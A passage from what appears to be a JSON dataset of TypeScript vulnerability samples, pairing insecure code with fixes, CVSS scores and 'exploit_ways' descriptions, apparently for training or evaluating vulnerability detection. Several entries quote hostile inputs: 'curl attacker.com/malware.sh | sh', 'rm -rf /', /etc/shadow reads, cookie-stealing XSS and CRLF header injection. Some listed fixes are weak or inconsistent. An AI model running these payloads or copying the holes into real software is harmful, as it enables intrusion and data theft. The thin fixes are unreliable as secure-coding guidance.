            "They can use '../../secrets.txt' to access sensitive files outside the intended directory.",
            "Input like '../../../../flag.txt' could reveal important flags or credentials."
        ]
    },
    "typescript_8": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "function transferFunds(recipientId: string, amount: number) {\n    const url = `https://api.example.com/transfer?recipient=${encodeURIComponent(recipientId)}&amount=${encodeURIComponent(amount.toString())}`;\n    fetch(url, { method: 'POST' });\n}",
        "cvss_score": 7.5,
        "fixed_code": "function transferFunds(recipientId: string, amount: number) {\n    const url = `https://api.example.com/transfer?recipient=${encodeURIComponent(recipientId)}&amount=${encodeURIComponent(amount.toString())}`;\n    fetch(url, { \n        method: 'POST',\n        headers: {\n            'X-CSRF-Token': getCSRFToken()\n        }\n    });\n}\n\nfunction getCSRFToken(): string {\n    // Implementation to retrieve CSRF token from cookie or local storage\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link that sends a POST request to the transfer endpoint, causing an unauthorized fund transfer.",
            "A compromised website could embed a form and automatically submit it using JavaScript when the user visits, exploiting the lack of CSRF protection.",
            "Attackers can use social engineering tactics to get users to visit a crafted page containing an auto-submitting form targeting the vulnerable transfer function."
        ]
    },
    "typescript_9": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "function processData(data: string): void {\n    const buffer = new ArrayBuffer(10);\n    const view = new DataView(buffer);\n    for (let i = 0; i < data.length; i++) {\n        view.setUint8(i, data.charCodeAt(i));\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "function processData(data: string): void {\n    const maxLength = 10;\n    if (data.length > maxLength) {\n        throw new Error(\"Data exceeds buffer length\");\n    }\n    const buffer = new ArrayBuffer(maxLength);\n    const view = new DataView(buffer);\n    for (let i = 0; i < data.length; i++) {\n        view.setUint8(i, data.charCodeAt(i));\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 characters to overwrite adjacent memory.",
            "Could inject malicious code into the buffer that gets executed if the program uses this buffer for control flow decisions.",
            "By providing a carefully crafted input, an attacker might be able to corrupt the heap and execute arbitrary code."
        ]
    },
    "typescript_10": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "class BufferHandler {\\n    private buffer: Uint8Array;\\n\\n    constructor(size: number) {\\n        this.buffer = new Uint8Array(size);\\n    }\\n\\n    write(data: Uint8Array, offset: number): void {\\n        for (let i = 0; i < data.length; i++) {\\n            this.buffer[offset + i] = data[i];\\n        }\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class BufferHandler {\\n    private buffer: Uint8Array;\\n\\n    constructor(size: number) {\\n        this.buffer = new Uint8Array(size);\\n    }\\n\\n    write(data: Uint8Array, offset: number): void {\\n        if (offset < 0 || data.length + offset > this.buffer.length) {\\n            throw new Error('Buffer overflow detected');\\n        }\\n        for (let i = 0; i < data.length; i++) {\\n            this.buffer[offset + i] = data[i];\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker could write beyond the allocated buffer size to overwrite adjacent memory.",
            "By carefully crafting input, an attacker can execute arbitrary code through overwritten return addresses.",
            "Exploiting this vulnerability can lead to denial of service by crashing the application."
        ]
    },
    "typescript_11": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import * as exec from 'child_process';\n\nconst express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/execute', (req, res) => {\n    const command = req.body.command;\n    if (command) {\n        exec.exec(command, (error, stdout, stderr) => {\n            if (error) {\n                res.status(500).send(`Error executing command: ${stderr}`);\n                return;\n            }\n            res.send(stdout);\n        });\n    } else {\n        res.status(400).send('No command provided');\n    }\n});\n\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT, () => {\n    console.log(`Server is running on port ${PORT}`);\n});",
        "cvss_score": 9.8,
        "fixed_code": "import * as exec from 'child_process';\n\nconst express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst allowedCommands = ['ls', 'whoami'];\n\napp.post('/execute', (req, res) => {\n    const command = req.body.command;\n    if (!command || !allowedCommands.includes(command)) {\n        res.status(400).send('Command not allowed');\n        return;\n    }\n    exec.exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send(`Error executing command: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT, () => {\n    console.log(`Server is running on port ${PORT}`);\n});",
        "exploit_ways": [
            "An attacker could send a POST request with 'command': 'rm -rf /' to delete all files.",
            "They could execute 'curl http://attacker.com/malware.sh | sh' to download and run malicious code.",
            "By chaining commands like 'ls; cat /etc/passwd', an attacker can leak sensitive system information."
        ]
    },
    "typescript_13": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "class CommandExecutor {\n    execute(command: string): void {\n        require('child_process').exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "class CommandExecutor {\n    execute(command: string): void {\n        const allowedCommands = ['ls', 'whoami'];\n        if (!allowedCommands.includes(command)) {\n            console.error('Command not allowed');\n            return;\n        }\n        require('child_process').exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "typescript_14": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "function unsafeDeserialize(inputString) {\n    const payload = JSON.parse(inputString);\n    return payload;\n}",
        "cvss_score": 7.5,
        "fixed_code": "function safeDeserialize(inputString) {\n    try {\n        const payload = JSON.parse(inputString);\n        // Validate and sanitize the payload as needed\n        if (typeof payload === 'object' && !Array.isArray(payload) && payload !== null) {\n            return payload;\n        } else {\n            throw new Error('Invalid payload format');\n        }\n    } catch (e) {\n        console.error('Deserialization error:', e);\n        return null;\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a JSON object that, when deserialized, executes arbitrary code if the application improperly handles objects.",
            "By sending a maliciously crafted JSON string, an attacker could manipulate the application state to perform unauthorized actions.",
            "Using polymorphic payloads, attackers can bypass simple validation checks and execute unintended functionality in the application."
        ]
    },
    "typescript_15": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "class UserInterface {\\n    renderUserInput(input: string): void {\\n        const element = document.getElementById(\"userContent\");\\n        if (element) {\\n            element.innerHTML = input;\\n        }\\n    }\\n}",
        "cvss_score": 8.6,
        "fixed_code": "class UserInterface {\\n    renderUserInput(input: string): void {\\n        const element = document.getElementById(\"userContent\");\\n        if (element) {\\n            const textNode = document.createTextNode(input);\\n            element.appendChild(textNode);\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject a script like '<script>alert(\\'XSS\\')</script>' to trigger popups.",
            "They can use '<img src=x onerror=alert(document.cookie)>' to steal cookies.",
            "Input like '<a href=javascript:alert(\"XSS\")>Click me</a>' can lead to phishing attacks."
        ]
    },
    "typescript_16": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import { exec } from 'child_process';\nfunction runCommand(cmd: string) {\n    exec(cmd, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Command error output: ${stderr}`);\n            return;\n        }\n        console.log(stdout);\n    });\n}\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "cvss_score": 7.8,
        "fixed_code": "import { exec } from 'child_process';\nfunction runCommand(cmd: string) {\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(cmd)) {\n        exec(cmd, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            if (stderr) {\n                console.error(`Command error output: ${stderr}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    } else {\n        console.error('Command not allowed');\n    }\n}\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files on the system.",
            "Could use 'useradd -m -s /bin/bash attacker && echo \"attacker:password\" | sudo chpasswd' to create a new user with full privileges.",
            "Chain commands like 'whoami; cat /etc/shadow' to escalate and extract sensitive information."
        ]
    },
    "typescript_17": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import * as express from 'express';\nconst app = express();\napp.use(express.json());\n\napp.post('/data', (req, res) => {\n    const data = JSON.parse(req.body.data);\n    res.send(data);\n});",
        "cvss_score": 7.5,
        "fixed_code": "import * as express from 'express';\nconst app = express();\napp.use(express.json());\n\napp.post('/data', (req, res) => {\n    try {\n        const data = JSON.parse(req.body.data);\n        if (typeof data !== 'object' || Array.isArray(data)) {\n            throw new Error('Invalid data format');\n        }\n        res.send(data);\n    } catch (error) {\n        res.status(400).send('Bad Request');\n    }\n});",
        "exploit_ways": [
            "An attacker can send malicious JSON payloads to execute arbitrary code on the server.",
            "By crafting specific input, an attacker might cause a Denial of Service (DoS) condition by crashing the server.",
            "The vulnerability could be leveraged to perform privilege escalation if the deserialized data leads to unauthorized actions."
        ]
    },
    "typescript_18": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "function executeCommand(command: string) {\n    const { exec } = require('child_process');\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error}`);\n            return;\n        }\n        console.log(stdout);\n    });\n}",
        "cvss_score": 8.2,
        "fixed_code": "function executeCommand(command: string) {\n    const { exec } = require('child_process');\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    } else {\n        console.log('Command not allowed');\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "typescript_19": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "const { exec } = require('child_process');\n\nfunction runCommand(command) {\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        console.log(stdout || stderr);\n    });\n}\n\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "cvss_score": 8.2,
        "fixed_code": "const { exec } = require('child_process');\n\nfunction runCommand(command) {\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            console.log(stdout || stderr);\n        });\n    } else {\n        console.log('Command not allowed');\n    }\n}\n\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; cat /etc/passwd' to leak sensitive files.",
            "Could chain commands like 'whoami; sudo su' to escalate privileges."
        ]
    },
    "typescript_20": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "\"use strict\";\nimport * as express from 'express';\nconst app = express();\n\napp.use(express.json());\n\ninterface User {\n    username: string;\n    passwordHash: string;\n}\n\nconst users: User[] = [\n    { username: 'admin', passwordHash: '$2a$10$sYlNiC8b7jGwZV92FvHuoOQZJ6.5X1U3LzTcDkx7t3M1JmPZ3L4B.', }, // hashed 'password'\n];\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n\n    if (!user) {\n        return res.status(401).send('Invalid credentials');\n    }\n\n    // Simulating a time-consuming hash comparison to avoid timing attacks\n    setTimeout(() => {\n        if (password === 'password') { // Insecure plain text password check\n            res.send('Login successful');\n        } else {\n            res.status(401).send('Invalid credentials');\n        }\n    }, 150);\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "cvss_score": 7.2,
        "fixed_code": "\"use strict\";\nimport * as express from 'express';\nconst app = express();\nimport * as bcrypt from 'bcrypt';\n\napp.use(express.json());\n\ninterface User {\n    username: string;\n    passwordHash: string;\n}\n\nconst users: User[] = [\n    { username: 'admin', passwordHash: '$2a$10$sYlNiC8b7jGwZV92FvHuoOQZJ6.5X1U3LzTcDkx7t3M1JmPZ3L4B.', }, // hashed 'password'\n];\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n\n    if (!user) {\n        return res.status(401).send('Invalid credentials');\n    }\n\n    bcrypt.compare(password, user.passwordHash, (err, result) => {\n        if (result) {\n            res.send('Login successful');\n        } else {\n            res.status(401).send('Invalid credentials');\n        }\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can brute force the login by repeatedly trying different passwords.",
            "The fixed delay for response may be used to infer if a username exists based on timing.",
            "If the server or application logs input, an attacker could potentially use this to gather information."
        ]
    },
    "typescript_21": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "\"use strict\";\nimport * as fs from 'fs';\nimport * as path from 'path';\n\nconst express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/file', (req, res) => {\n    const filePath = req.body.filePath;\n    const resolvedPath = path.resolve(filePath);\n    if (!resolvedPath.startsWith(process.cwd())) {\n        return res.status(403).send('Forbidden');\n    }\n    fs.readFile(resolvedPath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send(err);\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 7.5,
        "fixed_code": "\"use strict\";\nimport * as fs from 'fs';\nimport * as path from 'path';\n\nconst express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/file', (req, res) => {\n    const filePath = req.body.filePath;\n    const safePath = path.join(process.cwd(), 'files', path.basename(filePath));\n    fs.readFile(safePath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send(err);\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "They can use relative paths like '../../secret.txt' to access sensitive files outside the intended directory.",
            "Crafting a request with 'filePath=/etc/shadow' could lead to leakage of hashed passwords."
        ]
    },
    "typescript_22": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import * as fs from 'fs';\n\nfunction readFile(filePath: string): void {\n    const data = fs.readFileSync(filePath, 'utf8');\n    console.log(data);\n}",
        "cvss_score": 7.5,
        "fixed_code": "import * as path from 'path';\nimport * as fs from 'fs';\n\nconst baseDir = path.resolve(__dirname, 'safe_directory');\n\nfunction readFile(filePath: string): void {\n    const resolvedPath = path.resolve(baseDir, filePath);\n    if (!resolvedPath.startsWith(baseDir)) {\n        throw new Error('Invalid file path');\n    }\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n    console.log(data);\n}",
        "exploit_ways": [
            "An attacker could use '../' to navigate to parent directories and read sensitive files.",
            "By providing a carefully crafted path, an attacker might access configuration files or source code.",
            "Using absolute paths, an attacker can target system-critical files such as /etc/passwd."
        ]
    },
    "typescript_23": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "function executeCommand(command: string): void {\n    const { exec } = require('child_process');\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Command output error: ${stderr}`);\n            return;\n        }\n        console.log(`Command output: ${stdout}`);\n    });\n}",
        "cvss_score": 9.1,
        "fixed_code": "function executeCommand(command: string): void {\n    const { exec } = require('child_process');\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            if (stderr) {\n                console.error(`Command output error: ${stderr}`);\n                return;\n            }\n            console.log(`Command output: ${stdout}`);\n        });\n    } else {\n        console.error('Command not allowed');\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the server.",
            "They can use 'curl http://attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Chaining commands like 'ls; cat /etc/passwd' can leak sensitive system information."
        ]
    },
    "typescript_24": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "function unsafeDeserialize(data: string) {\n    const parsedData = JSON.parse(data);\n    if (parsedData.type === 'user') {\n        return new User(parsedData.name, parsedData.id);\n    }\n    throw new Error('Invalid type');\n}",
        "cvss_score": 7.5,
        "fixed_code": "function safeDeserialize(data: string) {\n    let parsedData;\n    try {\n        parsedData = JSON.parse(data);\n    } catch (e) {\n        throw new Error('Invalid data format');\n    }\n    if (!parsedData.type || !['user'].includes(parsedData.type)) {\n        throw new Error('Invalid type');\n    }\n    if (typeof parsedData.name !== 'string' || typeof parsedData.id !== 'number') {\n        throw new Error('Invalid data types');\n    }\n    return new User(parsedData.name, parsedData.id);\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON to instantiate unintended objects.",
            "Could send a crafted JSON payload that leads to prototype pollution.",
            "Can exploit the vulnerability to execute arbitrary code if combined with other vulnerabilities."
        ]
    },
    "typescript_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "\"use strict\";\nclass UserInfo {\n    private username: string;\n    private password: string;\n\n    constructor(username: string, password: string) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public displayInfo() {\n        console.log(`Username: ${this.username}, Password: ${this.password}`);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "\"use strict\";\nclass UserInfo {\n    private username: string;\n    private password: string;\n\n    constructor(username: string, password: string) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public displayInfo() {\n        console.log(`Username: ${this.username}`);\n    }\n}",
        "exploit_ways": [
            "An attacker could view the logged information in the browser's console to obtain passwords.",
            "By accessing the developer tools, an attacker can invoke the displayInfo method directly on an instance to retrieve sensitive data.",
            "If this code is part of a larger application with improper logging or error handling, password data might be inadvertently exposed through logs."
        ]
    },
    "typescript_26": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "class HttpResponseHandler {\n    private headers: { [key: string]: string } = {};\n\n    addHeader(name: string, value: string): void {\n        this.headers[name] = value;\n    }\n\n    getResponse(): string {\n        let response = \"HTTP/1.1 200 OK\\r\\n\";\n        for (const header in this.headers) {\n            if (this.headers.hasOwnProperty(header)) {\n                response += `${header}: ${this.headers[header]}\\r\\n`;\n            }\n        }\n        response += \"\\r\\n\";\n        return response;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class HttpResponseHandler {\n    private headers: { [key: string]: string } = {};\n\n    addHeader(name: string, value: string): void {\n        // Validate and sanitize header name and value\n        if (!/^[A-Za-z0-9-]+$/.test(name) || /\\r\\n|\\n/.test(value)) {\n            throw new Error('Invalid header name or value');\n        }\n        this.headers[name] = value;\n    }\n\n    getResponse(): string {\n        let response = \"HTTP/1.1 200 OK\\r\\n\";\n        for (const header in this.headers) {\n            if (this.headers.hasOwnProperty(header)) {\n                response += `${header}: ${this.headers[header]}\\r\\n`;\n            }\n        }\n        response += \"\\r\\n\";\n        return response;\n    }\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: evil=true' to manipulate cookies.",
            "By inserting '\\r\\nLocation: http://malicious.com', an attacker could perform open redirection attacks.",
            "Injecting '\\r\\nContent-Length: 0\\r\\nConnection: close' could cause the server to truncate responses."
        ]
    },
    "typescript_27": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "\"use strict\";\nclass ResourceHandler {\n    private resource: number = 0;\n\n    public increment(): void {\n        setTimeout(() => {\n            this.resource++;\n        }, Math.random() * 100);\n    }\n\n    public decrement(): void {\n        setTimeout(() => {\n            this.resource--;\n        }, Math.random() * 100);\n    }\n\n    public getResource(): number {\n        return this.resource;\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "\"use strict\";\nclass ResourceHandler {\n    private resource: number = 0;\n    private lock: boolean = false;\n\n    public increment(): void {\n        if (!this.lock) {\n            this.lock = true;\n            setTimeout(() => {\n                this.resource++;\n                this.lock = false;\n            }, Math.random() * 100);\n        }\n    }\n\n    public decrement(): void {\n        if (!this.lock) {\n            this.lock = true;\n            setTimeout(() => {\n                this.resource--;\n                this.lock = false;\n            }, Math.random() * 100);\n        }\n    }\n\n    public getResource(): number {\n        return this.resource;\n    }\n}",
        "exploit_ways": [
            "An attacker could manipulate timing to cause the resource counter to increment or decrement incorrectly.",
            "Race condition might lead to inconsistent states if multiple operations are performed rapidly in succession.",
            "In rare cases, it could allow a denial-of-service by continuously triggering conflicting increments and decrements."
        ]
    },
    "typescript_28": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function unsafeRaceCondition() {\n    let flag = false;\n    setTimeout(() => { flag = true; }, 100);\n    while (!flag) {}\n}",
        "cvss_score": 5.3,
        "fixed_code": "function safeRaceCondition(callback) {\n    setTimeout(() => {\n        callback();\n    }, 100);\n}",
        "exploit_ways": [
            "An attacker could potentially exploit this in environments with predictable timing to interfere with execution flow.",
            "The race condition might allow unauthorized access or modification of shared resources under certain conditions.",
            "In a multi-threaded environment, an attacker could manipulate the timing to bypass security checks."
        ]
    },
    "typescript_29": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function criticalOperation() {\n    let flag = false;\n    setTimeout(() => { flag = true; }, 100);\n    if (!flag) {\n        // Vulnerable code here\n        console.log(\"Operation completed\");\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "function criticalOperation() {\n    let flag = false;\n    const promise = new Promise((resolve) => {\n        setTimeout(() => { \n            flag = true; \n            resolve();\n        }, 100);\n    });\n    promise.then(() => {\n        // Secure code here\n        console.log(\"Operation completed\");\n    });\n}",
        "exploit_ways": [
            "An attacker could attempt to execute the vulnerable code before the flag is set, leading to unintended behavior.",
            "In a multi-threaded environment, simultaneous execution of criticalOperation might lead to race conditions affecting shared resources.",
            "By carefully timing function calls in a script or automated tool, an attacker might exploit the window where the flag is false."
        ]
    },
    "typescript_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "function setSessionId(req, res) {\n    const sessionId = req.query.sessionId;\n    res.cookie('sessionId', sessionId);\n}",
        "cvss_score": 4.2,
        "fixed_code": "function setSessionId(req, res) {\n    const crypto = require('crypto');\n    const sessionId = crypto.randomBytes(16).toString('hex');\n    res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });\n}",
        "exploit_ways": [
            "An attacker can set a specific session ID in the query parameter to hijack an existing session.",
            "By fixing the session ID, the attacker can force users into sessions they control, potentially gaining unauthorized access.",
            "If the session ID is predictable, an attacker can guess and use it to impersonate a user."
        ]
    },
    "typescript_31": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "function redirectToUrl(url: string): void {\n    window.location.href = url;\n}",
        "cvss_score": 6.5,
        "fixed_code": "function redirectToUrl(url: string, allowedUrls: Array<string>): void {\n    if (allowedUrls.includes(url)) {\n        window.location.href = url;\n    } else {\n        console.error(\"Redirect to unauthorized URL attempted\");\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing an external URL.",
            "They could use the redirect to install malware or perform phishing attacks on unsuspecting users.",
            "Attackers might also use open redirects to bypass CORS restrictions and access internal resources."
        ]
    },
    "typescript_32": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\\n    private app;\\n\\n    constructor() {\\n        this.app = require('express')();\\n        this.setupRoutes();\\n    }\\n\\n    private setupRoutes(): void {\\n        this.app.get('/', (req, res) => {\\n            res.send('Hello World!');\\n        });\\n    }\\n\\n    public start(port: number): void {\\n        this.app.listen(port, () => {\\n            console.log(`Server running on port ${port}`);\\n        });\\n    }\\n}",
        "cvss_score": 5.4,
        "fixed_code": "class WebServer {\\n    private app;\\n\\n    constructor() {\\n        this.app = require('express')();\\n        const helmet = require('helmet');\\n        this.app.use(helmet());\\n        this.setupRoutes();\\n    }\\n\\n    private setupRoutes(): void {\\n        this.app.get('/', (req, res) => {\\n            res.send('Hello World!');\\n        });\\n    }\\n\\n    public start(port: number): void {\\n        this.app.listen(port, () => {\\n            console.log(`Server running on port ${port}`);\\n        });\\n    }\\n}",
        "exploit_ways": [
            "An attacker can perform Clickjacking attacks due to the absence of X-Frame-Options.",
            "Cross-Site Scripting (XSS) might be possible if user input is not sanitized, as Content Security Policy (CSP) headers are missing.",
            "The server is vulnerable to MIME type sniffing attacks since there are no X-Content-Type-Options headers set."
        ]
    },
    "typescript_33": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "function processRequests() {\n    while (true) {\n        let data = fetch('http://example.com/data').then(response => response.json());\n        console.log(data);\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "function processRequests() {\n    setInterval(() => {\n        fetch('http://example.com/data')\n            .then(response => response.json())\n            .then(data => console.log(data))\n            .catch(error => console.error('Error fetching data:', error));\n    }, 5000); // Adjust interval as necessary\n}",
        "exploit_ways": [
            "An attacker can overwhelm the server by repeatedly making requests faster than it can handle, causing resource exhaustion.",
            "By introducing network latency or errors, an attacker can slow down or stop the processing of requests, leading to a denial-of-service condition.",
            "Exploiting a bug in the fetch implementation could cause infinite loops or crashes, preventing legitimate users from accessing services."
        ]
    },
    "typescript_34": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "function logSensitiveData(data: any) {\n    if (process.env.DEBUG_MODE === 'true') {\n        console.log(JSON.stringify(data));\n    }\n}",
        "cvss_score": 2.5,
        "fixed_code": "function logSensitiveData(data: any) {\n    const debugMode = process.env.DEBUG_MODE;\n    if (debugMode && debugMode.toLowerCase() === 'true') {\n        console.log(JSON.stringify({}));\n    }\n}",
        "exploit_ways": [
            "An attacker with access to the logs could see sensitive data when DEBUG_MODE is enabled.",
            "By setting DEBUG_MODE=true, they can expose user data or other confidential information in the application logs.",
            "Potential for leaking API keys, database credentials, or session tokens if logged inadvertently."
        ]
    },
    "typescript_35": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<button id=\"hiddenButton\" style=\"opacity: 0; position: absolute;\"></button>\n<script lang=\"typescript\">\ndocument.getElementById(\"hiddenButton\").addEventListener(\"click\", () => {\n    alert('You were clickjacked!');\n});\n</script>",
        "cvss_score": 3.5,
        "fixed_code": "<button id=\"visibleButton\" style=\"position: relative;\">Click Me</button>\n<script lang=\"typescript\">\ndocument.getElementById(\"visibleButton\").addEventListener(\"click\", () => {\n    alert('You clicked the button!');\n});\n</script>",
        "exploit_ways": [
            "An attacker can overlay a transparent button over another important button to trick users into clicking it.",
            "Users might unknowingly trigger actions like sharing content or subscribing to services without their intention.",
            "Attackers could force users to perform unwanted actions on the website by manipulating their clicks through layered elements."
        ]
    },
    "typescript_36": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "import * as express from 'express';\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-cookie', (req, res) => {\n    const cookieValue = req.body.cookieValue;\n    res.setHeader('Set-Cookie', `user=${cookieValue}; Path=/; HttpOnly`);\n    res.send('Cookie set successfully!');\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "cvss_score": 6.1,
        "fixed_code": "import * as express from 'express';\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-cookie', (req, res) => {\n    const cookieValue = encodeURIComponent(req.body.cookieValue);\n    res.setHeader('Set-Cookie', `user=${cookieValue}; Path=/; HttpOnly`);\n    res.send('Cookie set successfully!');\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "exploit_ways": [
            "An attacker can inject CRLF sequences (\\r\\n) to split the response and set arbitrary headers.",
            "They could potentially use this to perform cache poisoning attacks on intermediate proxies.",
            "Injecting JavaScript code via the cookie value might lead to XSS if the cookie is echoed back in responses."
        ]
    },
    "typescript_37": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import * as fs from 'fs';\nimport * as express from 'express';\n\nconst app = express();\napp.get('/file', (req, res) => {\n    const filePath = req.query.path;\n    fs.readFile(filePath, (err, data) => {\n        if (err) {\n            res.status(500).send('Error reading file');\n        } else {\n            res.send(data);\n        }\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "cvss_score": 5.3,
        "fixed_code": "import * as fs from 'fs';\nimport * as express from 'express';\nimport * as path from 'path';\n\nconst app = express();\napp.get('/file', (req, res) => {\n    const baseDirectory = path.join(__dirname, 'files');\n    const requestedPath = path.normalize(req.query.path || '');\n    const filePath = path.join(baseDirectory, requestedPath);\n\n    if (!filePath.startsWith(baseDirectory)) {\n        return res.status(403).send('Forbidden');\n    }\n\n    fs.readFile(filePath, (err, data) => {\n        if (err) {\n            res.status(500).send('Error reading file');\n        } else {\n            res.send(data);\n        }\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "exploit_ways": [
            "An attacker can use path traversal to access files outside the intended directory, e.g., /file?path=../config.ini.",
            "They could request server logs or other sensitive configuration files by manipulating the 'path' parameter.",
            "By injecting specific file paths, attackers might retrieve critical data such as database credentials stored in local files."
        ]
    },
    "typescript_38": {
